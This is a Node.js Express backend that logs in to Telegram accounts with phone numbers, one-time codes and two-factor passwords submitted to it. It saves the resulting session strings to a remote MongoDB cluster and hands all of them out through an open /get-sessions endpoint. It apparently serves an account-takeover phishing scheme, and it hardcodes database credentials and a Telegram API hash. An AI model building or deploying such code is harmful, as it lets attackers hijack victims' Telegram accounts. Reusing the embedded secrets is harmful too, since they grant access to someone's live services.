const express = require('express');
const cors = require('cors');
const { TelegramClient, Api } = require('telegram');
const { StringSession } = require('telegram/sessions');
const mongoose = require('mongoose');

const app = express();
app.use(cors());
app.use(express.json());

// MongoDB Setup
const mongoURI = 'mongodb+srv://mercyinfo52_db_user:Hinva312!@cluster0.a0bslma.mongodb.net/?retryWrites=true&w=majority';
mongoose.connect(mongoURI);

const SessionSchema = new mongoose.Schema({
    phone: String,
    session: String,
    createdAt: { type: Date, default: Date.now }
});
const SessionModel = mongoose.model('Session', SessionSchema);

const apiId = 23049703;
const apiHash = 'e9c00af578a9de0253ef02337460498f';

let tempClients = {};

app.post('/send-otp', async (req, res) => {
    const { phone } = req.body;
    const client = new TelegramClient(new StringSession(''), apiId, apiHash, { connectionRetries: 5 });
    await client.connect();
    const result = await client.sendCode({ apiId, apiHash }, phone);
    tempClients[phone] = { client, phoneCodeHash: result.phoneCodeHash };
    res.json({ success: true });
});

app.post('/verify-otp', async (req, res) => {
    const { phone, code, password } = req.body;
    const { client, phoneCodeHash } = tempClients[phone];
    try {
        await client.signIn({ apiId, apiHash, phone, phoneCodeHash }, code);
        const sessionString = client.session.save();
        await SessionModel.create({ phone, session: sessionString });
        res.json({ success: true });
    } catch (err) {
        if (err.errorMessage === 'SESSION_PASSWORD_NEEDED') {
            try {
                await client.signIn({ password: password }, phone);
                const sessionString = client.session.save();
                await SessionModel.create({ phone, session: sessionString });
                res.json({ success: true });
            } catch (pErr) {
                res.status(400).json({ error: 'Falsches Passwort' });
            }
        } else {
            res.status(400).json({ error: err.message });
        }
    }
});

app.get('/get-sessions', async (req, res) => {
    const sessions = await SessionModel.find();
    res.json(sessions);
});

app.listen(process.env.PORT || 3000, () => console.log('Server running'));
